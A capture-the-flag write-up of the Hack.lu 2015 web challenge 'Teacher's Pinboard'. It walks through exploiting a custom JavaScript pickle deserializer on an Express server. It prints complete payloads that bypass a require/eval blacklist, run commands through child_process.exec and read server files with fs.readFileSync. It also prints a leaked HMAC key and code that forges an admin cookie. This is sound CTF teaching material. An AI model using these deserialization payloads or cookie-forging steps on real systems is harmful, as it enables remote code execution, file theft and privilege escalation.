# Hack.lu CTF 2015: Teacher's Pinboard

**Category:** Web
**Points:** 350
**Solves:** 9
**Description:**

> I found the address of the [teacher's pinboard](https://school.fluxfingers.net:1502/)!
> Can you try to get in and read all teachers' notes?
> Maybe you need to attack the admin account as well.


## Write-up

by [agix](https://github.com/agix)

The application seems to be almost client side only. Login and registration are on the same form and you can login with the "admin" username.

It gives you access to new notes that you can modify and which would be stored in your localStorage with a PBKDF2 derived key of your password.

What's interesting here is the javascript file named pickle.js. Indeed one of the cookies is pickled.

`accountinfo=(dp0%0AS'username'%0Ap1%0AS'admin'%0Ap2%0AsS'password'%0Ap3%0AS'toto'%0Ap4%0AsS'admin'%0Ap5%0AI00%0As.`

Even if pickle seems to be the same as in python, the server is using Express (so it's a custom JavaScript implementation).

Reading the pickle.js source code show us `this` usage that doesn't exist in browser context. That suggests an adapted version of pickle.js is used on the server side.

It's easy to adapt the lib so it could be used as a NodeJS module (http://www.matteoagosti.com/blog/2013/02/24/writing-javascript-modules-for-both-browser-and-node/)

Now we can test pickle in server side context !

The Pickle syntax uses a stack to push and pop argument in various format, let's see what interesting features we have:

```
case REDUCE:
    var args = stack.pop();
    var func = stack.pop();
    var value = func.apply(this, args);
    stack.push(value);
    break;
```
If we push a function and an array of arguments we can execute it ! So we have to find a way to push a function.

```
case GLOBAL:
    var modulename = readline().slice(0,-1);
    var name = readline().slice(0,-1);
    var className = findClass(modulename, name);
    stack.push(className);
    break;
```
Basically, `findClass` takes two strings, a modulename and a name. It looks if modulename exists in `this` and returns `this[modulename][name]` if name exists in `this[modulename]`.

A blacklist of dangerous functions prevents usage of `eval` or `require`...

`BLACKLIST = ["require", "eval", "setTimeout", "setInterval", "setImmediate"];`

A well known technique used by [metasploit](https://github.com/gojhonny/metasploit-framework/blob/master/lib/msf/core/payload/nodejs.rb#L10) to retrieve the `require` function is to call `this.process.mainModule.constructor._load`.

So, if we use GLOBAL with `'process'` and `'mainModule'` arguments we can stack the `mainModule` object. How could we get access to `constructor` then `_load` as there is no case to pop object and push an arbitrary element of this object?

The way we found is to link the retrieved `mainModule` object into `this` so `this.mainModule` would exist and we could call GLOBAL to retrieve  `constructor` and do it again to retrieve `_load`.

To do that we used SETITEM :

```
case SETITEM:
    var value = stack.pop();
    var key = stack.pop();
    var obj = stack.pop();
    obj[key] = value;
    stack.push(obj);
    break;
```

If we push `this`, then an arbitrary string name (for the key), then the `mainModule` object, SETITEM will add it to this \o/.

How can we get `this` object on the stack ? Call GLOBAL with `'global'` and `'global'` !

Indeed, `global` is a circular reference to itself so `this.global.global === this`.

We have everything we need to retrieve the `require` function!

```
var pickle = ""+
"c"+ // GLOBAL
"global\n"+ //moduleName
"global\n"+ //name
// now `this` is on the stack
"S'a'\n"+ // push arbitrary String 'a' (arbitrary key name)
"c"+ // GLOBAL
"process\n"+ //moduleName
"mainModule\n"+ //name
// now we got [`this`, 'a', `process.mainModule`]
"s"+ // SETITEM
// `this` has a new parameter named 'a' which is the mainModule object !
// we do it again for constructor
"c"+ // GLOBAL
"global\n"+ //moduleName
"global\n"+ //name
"S'b'\n"+ // push arbitrary String 'b'
"c"+ // GLOBAL
"a\n"+ //moduleName
"constructor\n"+ //name
// now we got [`this`, 'b', `process.mainModule.constructor`]
"s"+ // SETITEM
// and again for `_load`
"c"+ // GLOBAL
"global\n"+ //moduleName
"global\n"+ //name
"S'rekire'\n"+ // push arbitrary String 'rekire'
"c"+ // GLOBAL
"b\n"+ //moduleName
"_load\n"+ //name
// now we got [`this`, 'rekire', `process.mainModule.constructor._load`]
"s" // SETITEM
```

We have an equivalent of the `require` function directly callable from `this.rekire`, so now we can `require` any library and use the same technique to retrieve any function.

```
pickle += ""+
"c"+ // GLOBAL
"global\n"+ //moduleName
"global\n"+ //name
"S'cp'\n"+ // push arbitrary String 'cp'
"c"+ // GLOBAL
"global\n"+ //moduleName
"rekire\n"+ //name
"("+ // a marker used to define the begining of something
"S'child_process'\n"+ // 'child_process' String
"l"+ // l create an array of elements until the marker
// stack looks like [`this`, 'cp', `this.rekire`, ['child_process']]
"R"+ // REDUCE apply `this.rekire` on 'child_process'
// stack looks like [`this`, 'cp', `child_process`]
"s"+ // SETITEM so we have this.cp accessible
"c"+ // GLOBAL
"cp\n"+ //moduleName
"exec\n"+ //name
"("+
"S'ping secret-in.me'\n"+
"l"+ // push pop 'ping secret-in.me' and push ['ping secret-in.me']
"R"+ // apply `cp.exec` on 'ping secret-in.me'
"." // the end
```

We tried `child_process.execSync` but the server version didn't appear to support it and `child_process.exec` in asynchronous mode didn't allow us to do any connect back...

We need a way to get some information back in the response.

If we send this kind of cookie (don't forget to encode \n in %0A) we can see in the response :

`Could not establish your login, <em>undefined</em>. Please try logging in again.`

The original cookie is a kind of dict `{username: 'admin', password: 'admin', admin: 0}`

If we send `(dp0\nS'username'\np1\nS'test's.` we get the error `Could not establish your login, <em>test</em>. Please try logging in again.`

The idea is to create `{username: 'leaked content'}`.

And that's all ! Using `fs.readdirSync` and `fs.readFileSync` we can leak directory content and dump the whole source code !


HERE IS THE WHOLE PICKLE DEFINITION

```
var pickle = ""+
"c"+ // GLOBAL
"global\n"+ //moduleName
"global\n"+ //name
// now `this` is on the stack
"S'a'\n"+ // push arbitrary String 'a' (arbitrary key name)
"c"+ // GLOBAL
"process\n"+ //moduleName
"mainModule\n"+ //name
// now we got [`this`, 'a', `process.mainModule`]
"s"+ // SETITEM
// `this` has a new parameter named 'a' which is the mainModule object !
// we do it again for constructor
"c"+ // GLOBAL
"global\n"+ //moduleName
"global\n"+ //name
"S'b'\n"+ // push arbitrary String 'b'
"c"+ // GLOBAL
"a\n"+ //moduleName
"constructor\n"+ //name
// now we got [`this`, 'b', `process.mainModule.constructor`]
"s"+ // SETITEM
// and again for `_load`
"c"+ // GLOBAL
"global\n"+ //moduleName
"global\n"+ //name
"S'rekire'\n"+ // push arbitrary String 'rekire'
"c"+ // GLOBAL
"b\n"+ //moduleName
"_load\n"+ //name
// now we got [`this`, 'rekire', `process.mainModule.constructor._load`]
"s" // SETITEM

pickle += ""+
"c"+ // GLOBAL
"global\n"+ //moduleName
"global\n"+ //name
"S'fs'\n"+ // push arbitrary String 'fs'
"c"+ // GLOBAL
"global\n"+ //moduleName
"rekire\n"+ //name
"("+ // a marker used to define the begining of something
"S'fs'\n"+ // 'fs' String
"l"+ // l create an array of elements until the marker
// stack looks like [`this`, 'fs', `this.rekire`, ['fs']]
"R"+ // REDUCE apply `this.rekire` on 'fs'
// stack looks like [`this`, 'fs', `fs`]
"s"+ // SETITEM so we have this.fs accessible

"(dp0\nS'username'\np1\n"+

"c"+ // GLOBAL
"fs\n"+ //moduleName
"readFileSync\n"+ //name
"("+
"S'/home/notesbin/sickle/notesbin/routes/account.js'\n"+
"l"+ // push pop 'ping secret-in.me' and push ['ping secret-in.me']
"R"+ // apply `cp.exec` on 'ping secret-in.me'
"s"+ // create dict {username: contentOfFile}
"." // the end
```

/home/notesbin/sickle/notesbin/routes/account.js

```
var express = require('express');
var router = express.Router();
var crypto = require('crypto');
const HMAC_KEY = 'gkcB2CSY1VZ7sri2dmafyyHl0qa8tJ65'; // not the flag. you must become admin.

/* GET users listing. */
router.get('/', function(req, res, next) {
  // sign-up form
  res.render('account_index', { error: req.query.error, title: "Sign up" });
});

router.post('/create', function (req, res, next) {
  // sign-up form receiver
  if (req.body) {
    if (('password' in req.body) && ('username' in req.body)) {
      u = req.body.username.replace(/[^a-zA-z0-9]/g,''); // protect against
      p = req.body.password.replace(/[^a-zA-z0-9]/g,''); // …injections

      var accountinfo = "(dp0\nS'username'\np1\nS'"+u+"'\np2\nsS'password'\np3\nS'"+p+"'\np4\nsS'admin'\np5\nI00\ns."
      var signature = crypto.createHmac('sha256', HMAC_KEY);
      signature.update(accountinfo);
      res.cookie('accountinfo', accountinfo, { maxAge: 31536000 }) // 1 year
      res.cookie('signature', signature.digest('hex'), { maxAge: 31536000 })
    }
    res.redirect("/"); // this is the absolute path, /
  }
  else {
    res.redirect('/?error'); // this is the relative path /account/?error
  }
  res.end();
});
router.get('/logout', function (req, res, next) {
  res.clearCookie('accountinfo');
  res.clearCookie('signature');
  res.redirect("/");
  res.end();
});

module.exports = router;
```

`not the flag. you must become admin`

We can now sign our cookie with admin set to 1 !


```
var crypto = require('crypto');
var accountinfo = "(dp0\nS'username'\np1\nS'agix'\np2\nsS'password'\np3\nS'agix'\np4\nsS'admin'\np5\nI01\ns."

const HMAC_KEY = 'gkcB2CSY1VZ7sri2dmafyyHl0qa8tJ65';

var signature = crypto.createHmac('sha256', HMAC_KEY);
signature.update(accountinfo);
console.log(signature.digest('hex'));

console.log(escape(accountinfo));
```

`The flag is:<pre>Jg7CGdFs3GaefwlPP8L3gPcnfY6hg9XV</pre>`

## Other write-ups and resources

* <https://frederik-braun.com/teachers-pinboard-hack-lu-2015.html>
